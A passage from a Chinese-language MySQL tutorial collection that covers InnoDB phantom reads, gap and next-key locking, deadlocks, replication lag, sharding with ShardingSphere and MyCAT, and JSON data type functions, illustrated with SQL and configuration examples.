-- INSERT INTO users VALUES (8, 'new', 26);

-- 第二次查询：3行 ← 幻读！
SELECT * FROM users WHERE age BETWEEN 20 AND 30;
-- id=2, age=25 | id=5, age=28 | id=8, age=26
```

### 1.2 快照读不会幻读

RR 隔离级别下，快照读通过 MVCC 的 ReadView 机制，始终读取事务开始时的数据快照，不会出现幻读。

### 1.3 当前读的幻读

当前读读取最新数据，不加间隙锁时会出现幻读：

```sql
BEGIN;
-- 当前读
SELECT * FROM users WHERE age BETWEEN 20 AND 30 FOR UPDATE;
-- 锁定 id=2 和 id=5 两行

-- 其他事务可以插入 age=26 的新行（行间间隙未被锁定）
INSERT INTO users VALUES (8, 'new', 26);  -- 成功！

-- 再次当前读
SELECT * FROM users WHERE age BETWEEN 20 AND 30 FOR UPDATE;
-- 多了一行！幻读！
```

## 2. 间隙锁（Gap Lock）

### 2.1 间隙锁概念

间隙锁锁定**索引记录之间的间隙**，阻止其他事务在间隙中插入新记录。

```
索引 age: ... | 20 | 25 | 28 | 30 | ...

间隙: (-∞, 20), (20, 25), (25, 28), (28, 30), (30, +∞)

Gap Lock 锁定 (20, 25) → 阻止插入 age=21,22,23,24
```

### 2.2 间隙锁的特性

- **纯抑制锁**：间隙锁之间不互斥，只阻止插入
- **不锁定记录本身**：只锁定记录间的间隙
- **仅在 RR 隔离级别生效**：RC 隔离级别下间隙锁失效
- **自动释放**：事务提交或回滚后释放

```sql
-- 两个事务可以同时持有同一间隙的 Gap Lock
-- 事务A: SELECT * FROM users WHERE age = 26 FOR UPDATE;  -- Gap Lock (25, 28)
-- 事务B: SELECT * FROM users WHERE age = 27 FOR UPDATE;  -- Gap Lock (25, 28) — 不冲突！
-- 但事务A或B都无法在 (25, 28) 间隙中插入数据
```

## 3. 临键锁（Next-Key Lock）

### 3.1 临键锁概念

临键锁 = **行锁（Record Lock） + 间隙锁（Gap Lock）**，锁定一条记录及其前面的间隙。

```
Next-Key Lock = Gap Lock (前间隙) + Record Lock (记录)

索引 age: ... | 20 | 25 | 28 | 30 | ...

Next-Key Lock 锁定 (20, 25]：
  - Gap Lock: (20, 25) — 阻止插入 age=21,22,23,24
  - Record Lock: 25 — 阻止修改/删除 age=25 的行
```

### 3.2 临键锁的加锁规则

InnoDB 的加锁规则（基于 MySQL 8.0）：

**规则1**：加锁的基本单位是 Next-Key Lock

**规则2**：查找过程中访问到的对象才会加锁

**规则3**：等值查询，唯一索引，Next-Key Lock 退化为行锁

**规则4**：等值查询，向右遍历到最后一个不满足条件的值时，Next-Key Lock 退化为 Gap Lock

**规则5**：范围查询，会对扫描到的范围加 Next-Key Lock

### 3.3 加锁示例

```sql
-- 表结构
CREATE TABLE t (id INT PRIMARY KEY, c INT, KEY(c));
INSERT INTO t VALUES (5,5), (10,10), (15,15), (20,20);

-- 示例1：等值查询唯一索引
SELECT * FROM t WHERE id = 10 FOR UPDATE;
-- 加锁: 行锁 id=10（规则3：唯一索引退化为行锁）

-- 示例2：等值查询普通索引
SELECT * FROM t WHERE c = 10 FOR UPDATE;
-- 加锁: Next-Key Lock (5, 10] + Gap Lock (10, 15)
-- (5,10]: c=10 的 Next-Key Lock
-- (10,15): 规则4，向右遍历到15不满足，退化为 Gap Lock

-- 示例3：范围查询
SELECT * FROM t WHERE c >= 10 AND c < 15 FOR UPDATE;
-- 加锁: Next-Key Lock (5, 10] + Next-Key Lock (10, 15]
-- 扫描到 c=10 和 c=15

-- 示例4：无匹配的等值查询
SELECT * FROM t WHERE c = 12 FOR UPDATE;
-- 加锁: Gap Lock (10, 15)
-- 规则4：c=12不存在，向右遍历到15，退化为 Gap Lock
```

## 4. 幻读解决方案

### 4.1 当前读 + 临键锁

```sql
BEGIN;
-- 当前读加临键锁
SELECT * FROM users WHERE age BETWEEN 20 AND 30 FOR UPDATE;

-- 加锁范围:
-- 假设索引 age 有值: 20, 25, 28, 30
-- Next-Key Lock: (20, 25], (25, 28], (28, 30]
-- Gap Lock: (30, +∞) 如果扫描到30之后

-- 其他事务无法在锁定范围内插入
INSERT INTO users VALUES (8, 'new', 26);  -- 阻塞！被 (25, 28] 阻止
INSERT INTO users VALUES (9, 'new', 22);  -- 阻塞！被 (20, 25] 阻止

-- 再次查询结果一致
SELECT * FROM users WHERE age BETWEEN 20 AND 30 FOR UPDATE;
COMMIT;
```

### 4.2 不同索引的加锁差异

```sql
-- 无索引：锁全表
SELECT * FROM users WHERE name = 'Alice' FOR UPDATE;
-- 所有行和间隙都被锁定

-- 主键索引：只锁行
SELECT * FROM users WHERE id = 5 FOR UPDATE;
-- 只锁 id=5 这一行

-- 唯一索引：锁索引行 + 主键行
SELECT * FROM users WHERE email = 'a@b.com' FOR UPDATE;
-- 唯一索引上的行锁 + 主键上的行锁

-- 普通索引：临键锁 + 主键行锁
SELECT * FROM users WHERE age = 25 FOR UPDATE;
-- age 索引: Next-Key Lock + Gap Lock
-- 主键索引: 行锁
```

## 5. 死锁场景分析

### 5.1 间隙锁导致的死锁

```sql
-- 初始数据: id=5(c=5), id=10(c=10)

-- 事务A
BEGIN;
SELECT * FROM t WHERE c = 7 FOR UPDATE;
-- Gap Lock (5, 10)

-- 事务B
BEGIN;
SELECT * FROM t WHERE c = 8 FOR UPDATE;
-- Gap Lock (5, 10) — 间隙锁不互斥

-- 事务A
INSERT INTO t VALUES (7, 7);
-- 等待事务B的 Gap Lock 释放

-- 事务B
INSERT INTO t VALUES (8, 8);
-- 等待事务A的 Gap Lock 释放
-- 死锁！
```

### 5.2 避免死锁的策略

1. **按固定顺序访问**：避免交叉锁定
2. **缩小锁定范围**：使用索引减少锁定行数
3. **降低隔离级别**：RC 下无间隙锁
4. **缩短事务**：减少持锁时间
5. **使用乐观锁**：避免使用 FOR UPDATE

```sql
-- 查看死锁日志
SHOW ENGINE INNODB STATUS;

-- 设置死锁超时（秒）
SET GLOBAL innodb_lock_wait_timeout = 50;
```

<!-- ============ 文档分隔线：020-mysql/070-ReplicationDelayCauseSolution.md ============ -->

## 1. 主从复制架构

### 1.1 复制流程

```mermaid
flowchart LR
    M[主库 Master<br/>Client SQL ↓<br/>Binlog Dump Thread] -->|Binlog 网络传输| S[从库 Slave<br/>Relay Log ↑<br/>I/O Thread<br/>SQL Thread ↑]
```

**三线程模型**（MySQL 5.7+）：

| 线程               | 位置 | 作用                       |
| ------------------ | ---- | -------------------------- |
| Binlog Dump Thread | 主库 | 发送 Binlog 事件给从库     |
| I/O Thread         | 从库 | 接收 Binlog 写入 Relay Log |
| SQL Thread         | 从库 | 回放 Relay Log 中的事件    |

### 1.2 延迟定义

```
延迟 = 主库执行时间 - 从库回放完成时间

监控命令:
SHOW SLAVE STATUS\G
-- Seconds_Behind_Master: 延迟秒数
```

## 2. 延迟根因分析

### 2.1 单线程回放瓶颈

传统从库只有**一个 SQL Thread** 回放事务，主库可以并行写入，从库只能串行回放：

```
主库（并行）:  T1 | T2 | T3 | T4  ← 同时执行
从库（串行）:  T1 → T2 → T3 → T4  ← 逐个回放

如果主库 QPS=10000，从库回放速度 < 10000 → 延迟持续增长
```

### 2.2 大事务

```sql
-- 单条大事务包含百万行修改
BEGIN;
DELETE FROM logs WHERE created_at < '2025-01-01';  -- 500万行
COMMIT;

-- 从库必须完整回放这个事务
-- 回放期间无法回放其他事务 → 延迟飙升
```

### 2.3 DDL 操作

```sql
-- ALTER TABLE 需要拷贝全表数据
ALTER TABLE big_table ADD COLUMN new_col INT;
-- 大表 ALTER 可能耗时数小时
-- 从库回放时阻塞所有其他事务
```

### 2.4 从库硬件差异

| 资源 | 主库     | 从库  | 影响          |
| ---- | -------- | ----- | ------------- |
| CPU  | 32核     | 8核   | 回放速度慢    |
| 磁盘 | NVMe SSD | HDD   | 刷盘慢        |
| 网络 | 10Gbps   | 1Gbps | Binlog 传输慢 |

### 2.5 主从不一致的查询

```sql
-- 从库上执行长查询，阻塞 SQL Thread
-- 从库用于读查询时，长事务可能持有锁
SELECT * FROM big_table WHERE ...;  -- 扫描全表，持锁时间长

-- SQL Thread 等待锁释放 → 延迟
```

## 3. 解决方案

### 3.1 多线程并行复制（MTS）

**库级并行**（MySQL 5.6）：

```sql
-- 按数据库维度并行
SET GLOBAL slave_parallel_type = 'DATABASE';
SET GLOBAL slave_parallel_workers = 8;
```

限制：单库场景无法并行。

**组提交并行**（MySQL 5.7）：

```sql
-- 基于 Binlog Group Commit 的并行
SET GLOBAL slave_parallel_type = 'LOGICAL_CLOCK';
SET GLOBAL slave_parallel_workers = 16;
-- 同一组提交的事务可以并行回放
```

**WRITESET 并行**（MySQL 8.0）：

```sql
-- 基于行修改的依赖关系并行
SET GLOBAL binlog_transaction_dependency_tracking = WRITESET;
SET GLOBAL slave_parallel_workers = 32;
SET Global transaction_write_set_extraction = XXHASH64;
-- 修改不同行的事务可以并行回放
```

| 方案          | 并行度     | 适用场景   |
| ------------- | ---------- | ---------- |
| DATABASE      | 库数量     | 多库业务   |
| LOGICAL_CLOCK | 组提交大小 | 中等并发   |
| WRITESET      | 行级无冲突 | 高并发单库 |

### 3.2 半同步复制

```sql
-- 安装半同步插件
INSTALL PLUGIN rpl_semi_sync_master SONAME 'semisync_master.so';
INSTALL PLUGIN rpl_semi_sync_slave SONAME 'semisync_slave.so';

-- 启用半同步
SET GLOBAL rpl_semi_sync_master_enabled = 1;
SET GLOBAL rpl_semi_sync_slave_enabled = 1;

-- 等待超时（毫秒）
SET GLOBAL rpl_semi_sync_master_timeout = 3000;
```

半同步不直接解决延迟，但保证数据不丢失，从库至少收到 Binlog。

### 3.3 并行复制监控

```sql
-- 查看并行复制状态
SHOW SLAVE STATUS\G

-- 关键指标:
-- Seconds_Behind_Master: 延迟秒数
-- Slave_SQL_Running_State: SQL线程状态
-- Exec_Master_Log_Pos: 已回放位置

-- MySQL 8.0 性能库
SELECT * FROM performance_schema.replication_applier_status_by_worker;
```

### 3.4 大事务拆分

```sql
-- 反模式：单条大事务
DELETE FROM logs WHERE created_at < '2025-01-01';  -- 500万行

-- 正确：分批删除
-- 方案1：LIMIT 分批
DELETE FROM logs WHERE created_at < '2025-01-01' LIMIT 10000;
-- 重复执行直到影响行数为0

-- 方案2：按时间分批
DELETE FROM logs WHERE created_at BETWEEN '2024-01-01' AND '2024-02-01';
DELETE FROM logs WHERE created_at BETWEEN '2024-02-01' AND '2024-03-01';
-- ...

-- 方案3：pt-archiver 工具
pt-archiver --source h=host,D=db,t=logs \
  --where "created_at < '2025-01-01'" \
  --purge --limit 10000 --commit-each
```

### 3.5 从库读流量优化

```sql
-- 1. 使用 READ COMMITTED 减少锁持有时间
SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;

-- 2. 避免长事务
SET SESSION innodb_lock_wait_timeout = 5;

-- 3. 使用 pt-query-digest 分析慢查询
-- pt-query-digest slow.log

-- 4. 从库使用 read_only
SET GLOBAL read_only = ON;
SET GLOBAL super_read_only = ON;
```

## 4. 延迟监控与告警

### 4.1 监控指标

```sql
-- 延迟秒数
SHOW SLAVE STATUS\G  -- Seconds_Behind_Master

-- Binlog 位置差异
-- Master_Log_File vs Relay_Master_Log_File
-- Read_Master_Log_Pos vs Exec_Master_Log_Pos

-- MySQL 8.0 延迟直方图
SELECT * FROM performance_schema.replication_connection_status;
```

### 4.2 延迟容忍策略

```
应用层策略：
1. 读写分离时，关键业务读主库
2. 从库延迟超过阈值时，降级读主库
3. 使用 ProxySQL / MaxSQL 自动路由
4. 业务层缓存减少从库读压力
```

<!-- ============ 文档分隔线：020-mysql/071-ShardingStrategy.md ============ -->

## 1. 分库分表概述

### 1.1 为什么需要分库分表

| 问题             | 阈值        | 影响         |
| ---------------- | ----------- | ------------ |
| 单表数据量过大   | > 5000万行  | 查询性能下降 |
| 单库连接数过多   | > 5000      | 连接池耗尽   |
| 单机磁盘容量不足 | > 2TB       | 无法写入     |
| 写入瓶颈         | > 10000 TPS | 主库延迟     |

### 1.2 拆分维度

```
垂直拆分：按业务/模块拆分（微服务化）
水平拆分：按数据行拆分（同结构多表/多库）

垂直分库: 用户库 | 订单库 | 商品库
垂直分表: 订单基础信息表 | 订单详情表
水平分库: order_db_0 | order_db_1 | order_db_2
水平分表: order_0 | order_1 | ... | order_15
```

## 2. 垂直拆分

### 2.1 垂直分库

将不同业务的表拆分到不同数据库：

```mermaid
flowchart TD
    T0["原始: monolith_db"]
    T1["users, profiles, accounts"]
    T2["orders, order_items, payments"]
    T3["products, categories, inventory"]
    T4["拆分后:"]
    T5["user_db:    users, profiles, accounts"]
    T6["order_db:   orders, order_items, payments"]
    T7["product_db: products, categories, inventory"]
    T0 --> T1
    T0 --> T2
    T0 --> T3
    T3 --> T4
    T4 --> T5
    T5 --> T6
    T6 --> T7
```

**优点**：业务解耦、独立扩展、故障隔离
**缺点**：跨库 JOIN、分布式事务

### 2.2 垂直分表

将大表的列拆分为多个表：

```sql
-- 原始表
CREATE TABLE users (
    id          INT PRIMARY KEY,
    name        VARCHAR(50),
    email       VARCHAR(100),
    avatar_url  VARCHAR(500),   -- 大字段
    bio         TEXT,            -- 大字段
    settings    JSON,            -- 低频访问
    created_at  TIMESTAMP
);

-- 拆分后
CREATE TABLE users_base (
    id          INT PRIMARY KEY,
    name        VARCHAR(50),
    email       VARCHAR(100),
    created_at  TIMESTAMP
);

CREATE TABLE users_profile (
    user_id     INT PRIMARY KEY,
    avatar_url  VARCHAR(500),
    bio         TEXT,
    settings    JSON,
    FOREIGN KEY (user_id) REFERENCES users_base(id)
);
```

## 3. 水平拆分

### 3.1 分片键选择

分片键（Sharding Key）决定了数据如何分布：

| 分片键      | 优点                 | 缺点                 |
| ----------- | -------------------- | -------------------- |
| user_id     | 按用户隔离，查询集中 | 数据倾斜（大用户）   |
| order_id    | 均匀分布             | 按用户查询需扫描多片 |
| create_time | 按时间归档           | 热点写入             |

**选择原则**：

1. 高频查询条件包含分片键
2. 数据分布均匀
3. 尽量避免跨片查询

### 3.2 分片算法

**Hash 取模**：

```
分片号 = hash(shard_key) % N

user_id=123 → 123 % 4 = 3 → 分片3
user_id=456 → 456 % 4 = 0 → 分片0

优点: 数据分布均匀
缺点: 扩容需要数据迁移（rehash）
```

**Range 范围**：

```
user_id 1-100万    → 分片0
user_id 100万-200万 → 分片1
user_id 200万-300万 → 分片2

优点: 扩容方便（新增范围）
缺点: 数据可能倾斜（热点范围）
```

**一致性哈希**：

```
将分片节点映射到 0-2^32 的环上
数据 key 的 hash 值顺时针找到最近的节点

优点: 扩容只需迁移少量数据
缺点: 实现复杂
```

### 3.3 分片数量规划

```
目标数据量: 10亿行
单表推荐量: 2000万行
分表数: 10亿 / 2000万 = 50

分库数: 根据连接数和磁盘容量
  单库 2000连接 → 5个库 → 每库 10张表

最终: 5库 × 10表 = 50张表
命名: order_db_0.order_0 ~ order_db_4.order_9
```

## 4. ShardingSphere

### 4.1 ShardingSphere-JDBC 配置

```yaml
# application.yml
spring:
  shardingsphere:
    datasource:
      names: ds0, ds1
      ds0:
        type: com.zaxxer.hikari.HikariDataSource
        jdbc-url: jdbc:mysql://localhost:3306/order_db_0
        username: root
        password: root
      ds1:
        type: com.zaxxer.hikari.HikariDataSource
        jdbc-url: jdbc:mysql://localhost:3306/order_db_1
        username: root
        password: root
    rules:
      sharding:
        tables:
          t_order:
            actual-data-nodes: ds${0..1}.t_order_${0..15}
            table-strategy:
              standard:
                sharding-column: user_id
                sharding-algorithm-name: order-table-mod
            database-strategy:
              standard:
                sharding-column: user_id
                sharding-algorithm-name: order-db-mod
            key-generate-strategy:
              column: order_id
              key-generator-name: snowflake
        sharding-algorithms:
          order-table-mod:
            type: MOD
            props:
              sharding-count: 16
          order-db-mod:
            type: MOD
            props:
              sharding-count: 2
        key-generators:
          snowflake:
            type: SNOWFLAKE
```

### 4.2 分布式主键

| 方案           | 原理           | 优点         | 缺点         |
| -------------- | -------------- | ------------ | ------------ |
| Auto Increment | 各片不同起始值 | 简单         | 扩容困难     |
| UUID           | 随机生成       | 无需协调     | 无序、索引差 |
| Snowflake      | 时间+机器+序列 | 有序、高性能 | 时钟回拨     |
| 号段模式       | 预分配号段     | 高性能       | 依赖中心服务 |

```sql
-- Snowflake ID 结构 (64位)
-- 1位符号 | 41位时间戳 | 10位机器ID | 12位序列号
-- 每毫秒可生成 4096 个ID
-- 可用约69年
```

### 4.3 跨片查询处理

```sql
-- ShardingSphere 自动路由
SELECT * FROM t_order WHERE user_id = 100;
-- 路由到: ds0.t_order_4

-- 跨片查询
SELECT * FROM t_order WHERE status = 'pending';
-- 广播到所有分片，合并结果

-- 排序分页
SELECT * FROM t_order ORDER BY created_at DESC LIMIT 10;
-- 各分片取 TOP 10 → 合并排序 → 取全局 TOP 10
```

## 5. MyCAT

### 5.1 MyCAT 架构

```
应用 → MyCAT (代理层) → 后端 MySQL 实例

MyCAT 作为数据库代理，应用连接 MyCAT 如同连接 MySQL
MyCAT 负责路由、合并、过滤
```

### 5.2 MyCAT 配置

```xml
<!-- schema.xml -->
<schema name="ORDER_DB" checkSQLschema="false">
    <table name="t_order" primaryKey="order_id"
           dataNode="dn1,dn2,dn3,dn4"
           rule="mod-long" />
</schema>

<dataNode name="dn1" dataHost="host1" database="order_db_0" />
<dataNode name="dn2" dataHost="host1" database="order_db_1" />
<dataNode name="dn3" dataHost="host2" database="order_db_0" />
<dataNode name="dn4" dataHost="host2" database="order_db_1" />

<!-- rule.xml -->
<tableRule name="mod-long">
    <rule>
        <columns>user_id</columns>
        <algorithm>mod-long</algorithm>
    </rule>
</tableRule>
<function name="mod-long" class="io.mycat.route.function.PartitionByMod">
    <property name="count">4</property>
</function>
```

### 5.3 ShardingSphere vs MyCAT

| 维度   | ShardingSphere  | MyCAT        |
| ------ | --------------- | ------------ |
| 架构   | JDBC/Proxy      | Proxy        |
| 性能   | JDBC直连更高    | 网络开销     |
| 部署   | 无需独立部署    | 需要独立部署 |
| 语言   | Java            | Java         |
| 社区   | Apache 顶级项目 | 社区维护     |
| 推荐度 |                 |              |

## 6. 分库分表后的挑战

### 6.1 跨库 JOIN

```sql
-- 无法直接 JOIN
SELECT o.*, u.name FROM t_order o JOIN t_user u ON o.user_id = u.id;

-- 解决方案:
-- 1. 冗余字段: t_order 中冗余 user_name
-- 2. 应用层组装: 分别查询后代码合并
-- 3. 广播表: 小表复制到所有库
-- 4. ER分片: 关联表按相同分片键分布
```

### 6.2 分布式事务

```sql
-- ShardingSphere 分布式事务
-- XA 事务
SET GLOBAL transaction_type = XA;
BEGIN;
INSERT INTO t_order ...;  -- 分片1
INSERT INTO t_order ...;  -- 分片2
COMMIT;  -- 两阶段提交

-- BASE 事务（Saga）
SET GLOBAL transaction_type = BASE;
-- 最终一致性
```

### 6.3 扩容与数据迁移

```
扩容方案:
1. 停机迁移: 停服 → 数据迁移 → 启动新配置
2. 双写迁移: 新旧双写 → 历史数据迁移 → 切换
3. 一致性哈希: 仅迁移少量数据

推荐: ShardingSphere Scaling 模块
  在线扩容，自动数据迁移，无需停服
```

<!-- ============ 文档分隔线：020-mysql/072-JSONTypeJSONTable.md ============ -->

## 1. JSON 数据类型

### 1.1 JSON vs JSON 文本

```sql
-- JSON 类型（MySQL 5.7+）：自动校验、二进制存储、支持部分更新
CREATE TABLE users (
    id       INT PRIMARY KEY,
    profile  JSON          -- 原生 JSON 类型
);

-- JSON 文本（传统方式）：VARCHAR/TEXT 存储，无校验
CREATE TABLE users_old (
    id       INT PRIMARY KEY,
    profile  TEXT          -- 手动存储 JSON 字符串
);
```

| 特性     | JSON 类型            | TEXT 存储  |
| -------- | -------------------- | ---------- |
| 自动校验 | 插入时验证           | 无验证     |
| 存储格式 | 二进制（部分格式化） | 原始字符串 |
| 部分更新 | 支持（JSON_SET 等）  | 需整体替换 |
| 索引     | 虚拟列/函数索引      | 全文索引   |
| 空间开销 | 略大于原始文本       | 原始大小   |

### 1.2 JSON 插入与校验

```sql
-- 有效 JSON
INSERT INTO users VALUES (1, '{"name": "Alice", "age": 30, "tags": ["dev", "go"]}');

-- 无效 JSON → 报错
INSERT INTO users VALUES (2, '{name: Alice}');  -- 缺少引号
-- ERROR 3140 (22032): Invalid JSON text

-- JSON 数组
INSERT INTO users VALUES (3, '[1, 2, 3, "hello", null, true]');

-- 嵌套 JSON
INSERT INTO users VALUES (4, '{
    "name": "Bob",
    "address": {
        "city": "Beijing",
        "zip": "100000"
    },
    "orders": [
        {"id": 1, "amount": 99.9},
        {"id": 2, "amount": 199.9}
    ]
}');
```

## 2. JSON 查询函数

### 2.1 提取函数

```sql
-- JSON_EXTRACT: 提取值（返回 JSON 类型）
SELECT JSON_EXTRACT(profile, '$.name') FROM users WHERE id = 1;
-- "Alice"

-- -> 运算符（JSON_EXTRACT 的简写）
SELECT profile->'$.name' FROM users WHERE id = 1;
-- "Alice"

-- ->> 运算符（提取并取消引号）
SELECT profile->>'$.name' FROM users WHERE id = 1;
-- Alice

-- 提取嵌套值
SELECT profile->>'$.address.city' FROM users WHERE id = 4;
-- Beijing

-- 提取数组元素
SELECT profile->'$.orders[0].amount' FROM users WHERE id = 4;
-- 99.9

-- 提取数组所有元素
SELECT profile->'$.tags[*]' FROM users WHERE id = 1;
-- ["dev", "go"]
```

### 2.2 JSON_PATH 语法

```
$           根元素
.key        对象的 key
[num]       数组的第 num 个元素
[*]         数组所有元素
..          递归下降（MySQL 8.0+）
[last]      数组最后一个元素
[last-1]    数组倒数第二个元素
[to last]   从某位置到末尾
```

### 2.3 修改函数

```sql
-- JSON_SET: 设置值（存在则更新，不存在则创建）
UPDATE users SET profile = JSON_SET(profile, '$.age', 31) WHERE id = 1;

-- JSON_INSERT: 插入值（仅不存在时创建）
UPDATE users SET profile = JSON_INSERT(profile, '$.email', 'alice@example.com') WHERE id = 1;

-- JSON_REPLACE: 替换值（仅存在时更新）
UPDATE users SET profile = JSON_REPLACE(profile, '$.age', 32) WHERE id = 1;

-- JSON_REMOVE: 删除值
UPDATE users SET profile = JSON_REMOVE(profile, '$.tags') WHERE id = 1;

-- JSON_ARRAY_APPEND: 追加数组元素
UPDATE users SET profile = JSON_ARRAY_APPEND(profile, '$.tags', 'java') WHERE id = 1;

-- JSON_MERGE_PATCH: 合并（覆盖同 key）
UPDATE users SET profile = JSON_MERGE_PATCH(profile, '{"age": 33, "level": "senior"}') WHERE id = 1;
```

### 2.4 查询与搜索函数

```sql
-- JSON_CONTAINS: 是否包含指定值
SELECT * FROM users WHERE JSON_CONTAINS(profile->'$.tags', '"dev"');

-- JSON_CONTAINS_PATH: 是否包含指定路径
SELECT * FROM users WHERE JSON_CONTAINS_PATH(profile, 'one', '$.email');

-- JSON_SEARCH: 搜索值返回路径
SELECT JSON_SEARCH(profile, 'one', 'Alice') FROM users;

-- JSON_KEYS: 获取所有 key
SELECT JSON_KEYS(profile) FROM users WHERE id = 1;

-- JSON_LENGTH: 获取长度
SELECT JSON_LENGTH(profile->'$.tags') FROM users WHERE id = 1;

-- JSON_TYPE: 获取类型
SELECT JSON_TYPE(profile->'$.name') FROM users WHERE id = 1;  -- STRING

-- JSON_VALID: 是否有效 JSON
SELECT JSON_VALID('{"a":1}');  -- 1
```

## 3. JSON_TABLE

### 3.1 基本语法

JSON_TABLE（MySQL 8.0+）将 JSON 数组展开为关系表：

```sql
JSON_TABLE(
    json_doc,
    path COLUMNS (
        column_definition
    )
) [AS] alias
```

### 3.2 展开对象数组

```sql
-- 订单表，items 为 JSON 数组
CREATE TABLE orders (
    id    INT PRIMARY KEY,
    items JSON
);

INSERT INTO orders VALUES (1, '[
    {"product_id": 101, "name": "iPhone", "qty": 2, "price": 7999},
    {"product_id": 102, "name": "AirPods", "qty": 1, "price": 1299},
    {"product_id": 103, "name": "Case", "qty": 3, "price": 199}
]');

-- 使用 JSON_TABLE 展开
SELECT
    o.id AS order_id,
    jt.product_id,
    jt.name,
    jt.qty,
    jt.price,
    jt.qty * jt.price AS subtotal
FROM orders o,
JSON_TABLE(
    o.items,
    '$[*]' COLUMNS (
        product_id INT PATH '$.product_id',
        name       VARCHAR(50) PATH '$.name',
        qty        INT PATH '$.qty',
        price      DECIMAL(10,2) PATH '$.price'
    )
) AS jt;
```

输出：

```
order_id | product_id | name    | qty | price | subtotal
---------|------------|---------|-----|-------|--------
1        | 101        | iPhone  | 2   | 7999  | 15998
1        | 102        | AirPods | 1   | 1299  | 1299
1        | 103        | Case    | 3   | 199   | 597
```

### 3.3 嵌套展开（NESTED PATH）

```sql
-- 嵌套 JSON 结构
INSERT INTO orders VALUES (2, '[
    {
        "product_id": 201,
        "name": "MacBook",
        "variants": [
            {"color": "Silver", "stock": 10},
            {"color": "Space Gray", "stock": 5}
        ]
    }
]');

SELECT
    o.id,
    jt.product_id,
    jt.name,
    nt.color,
    nt.stock
FROM orders o,
JSON_TABLE(
    o.items,
    '$[*]' COLUMNS (
        product_id INT PATH '$.product_id',
        name       VARCHAR(50) PATH '$.name',
        NESTED PATH '$.variants[*]' COLUMNS (
            color VARCHAR(20) PATH '$.color',
            stock INT PATH '$.stock'
        )
    )
) AS jt;
```

### 3.4 ORDINALITY 列

```sql
-- ORDINALITY 自动生成行号
SELECT
    jt.row_num,
    jt.name
FROM orders o,
JSON_TABLE(
    o.items,
    '$[*]' COLUMNS (
        row_num FOR ORDINALITY,
        name VARCHAR(50) PATH '$.name'
    )
) AS jt
WHERE o.id = 1;
```

### 3.5 处理缺失值

```sql
-- DEFAULT ON ERROR / EMPTY
JSON_TABLE(
    o.items,
    '$[*]' COLUMNS (
        name VARCHAR(50) PATH '$.name',
        discount DECIMAL(5,2) PATH '$.discount' DEFAULT '0.00' ON EMPTY
    )
) AS jt
```

## 4. JSON 索引优化

### 4.1 虚拟列索引

```sql
-- 为 JSON 字段创建虚拟列 + 索引
ALTER TABLE users
ADD COLUMN name_virtual VARCHAR(50)
    GENERATED ALWAYS AS (JSON_UNQUOTE(profile->'$.name')) VIRTUAL,
ADD INDEX idx_name (name_virtual);

-- 查询走索引
SELECT * FROM users WHERE name_virtual = 'Alice';
```

### 4.2 函数索引（MySQL 8.0+）

```sql
-- 直接创建函数索引
ALTER TABLE users
ADD INDEX idx_json_name ((CAST(profile->>'$.name' AS CHAR(50))));
```

### 4.3 多值索引（MySQL 8.0.17+）

```sql
-- 为 JSON 数组创建多值索引
ALTER TABLE users
ADD INDEX idx_tags ((CAST(profile->'$.tags' AS CHAR(50) ARRAY)));

-- 使用 MEMBER OF 查询
SELECT * FROM users WHERE 'dev' MEMBER OF(profile->'$.tags');

-- 使用 JSON_OVERLAPS
SELECT * FROM users WHERE JSON_OVERLAPS(profile->'$.tags', '["dev", "java"]');
```
## JSON 数据类型

**换行写法：创建 JSON 类型列**
`CREATE TABLE <表名> (<列名> INT PRIMARY KEY, <JSON 列名> JSON)`
```sql
-- 创建包含原生 JSON 类型的表
CREATE TABLE users (
    id       INT PRIMARY KEY,
    profile  JSON
);
```

**单行写法：插入有效 JSON 对象**
`INSERT INTO <表名> VALUES (<值>, '<JSON 字符串>')`
```sql
-- 插入有效 JSON 对象数据
INSERT INTO users VALUES (1, '{"name": "Alice", "age": 30, "tags": ["dev", "go"]}');
```

**单行写法：插入 JSON 数组**
`INSERT INTO <表名> VALUES (<值>, '<JSON 数组>')`
```sql
-- 插入 JSON 数组数据
INSERT INTO users VALUES (3, '[1, 2, 3, "hello", null, true]');
```

**换行写法：插入嵌套 JSON**
`INSERT INTO <表名> VALUES (<值>, '<嵌套 JSON 字符串>')`
```sql
-- 插入嵌套结构的 JSON 数据
INSERT INTO users VALUES (4, '{
    "name": "Bob",
    "address": {
        "city": "Beijing",
        "zip": "100000"
    },
    "orders": [
        {"id": 1, "amount": 99.9},
        {"id": 2, "amount": 199.9}
    ]
}');
```

---

## JSON 提取函数

**单行写法：JSON_EXTRACT 提取值**
`JSON_EXTRACT(<JSON 列>, '<路径>')`
```sql
-- 提取 JSON 中的 name 字段值
SELECT JSON_EXTRACT(profile, '$.name') FROM users WHERE id = 1;
```

**单行写法：-> 运算符提取值**
`<JSON 列>->'<路径>'`
```sql
-- 使用 -> 运算符提取 name 字段
SELECT profile->'$.name' FROM users WHERE id = 1;
```

**单行写法：->> 运算符提取并取消引号**
`<JSON 列>->>'<路径>'`
```sql
-- 提取 name 字段并取消引号
SELECT profile->>'$.name' FROM users WHERE id = 1;
```

**单行写法：提取嵌套值**
`<JSON 列>->>'<嵌套路径>'`
```sql
-- 提取嵌套的 address.city 字段
SELECT profile->>'$.address.city' FROM users WHERE id = 4;
```

**单行写法：提取数组元素**
`<JSON 列>->'<数组路径>'`
```sql
-- 提取 orders 数组第一个元素的 amount
SELECT profile->'$.orders[0].amount' FROM users WHERE id = 4;
```

**单行写法：提取数组所有元素**
`<JSON 列>->'<数组路径>[*]'`
```sql
-- 提取 tags 数组的所有元素
SELECT profile->'$.tags[*]' FROM users WHERE id = 1;
```

---

## JSON 修改函数

**单行写法：JSON_SET 设置值**
`JSON_SET(<JSON 列>, '<路径>', <值>[, '<路径>', <值>...])`
```sql
-- 设置 age 字段值（存在则更新不存在则创建）
UPDATE users SET profile = JSON_SET(profile, '$.age', 31) WHERE id = 1;
```

**单行写法：JSON_INSERT 插入值**
`JSON_INSERT(<JSON 列>, '<路径>', <值>)`
```sql
-- 插入 email 字段（仅不存在时创建）
UPDATE users SET profile = JSON_INSERT(profile, '$.email', 'alice@example.com') WHERE id = 1;
```

**单行写法：JSON_REPLACE 替换值**
`JSON_REPLACE(<JSON 列>, '<路径>', <值>)`
```sql
-- 替换 age 字段值（仅存在时更新）
UPDATE users SET profile = JSON_REPLACE(profile, '$.age', 32) WHERE id = 1;
```

**单行写法：JSON_REMOVE 删除值**
`JSON_REMOVE(<JSON 列>, '<路径>')`
```sql
-- 删除 tags 字段
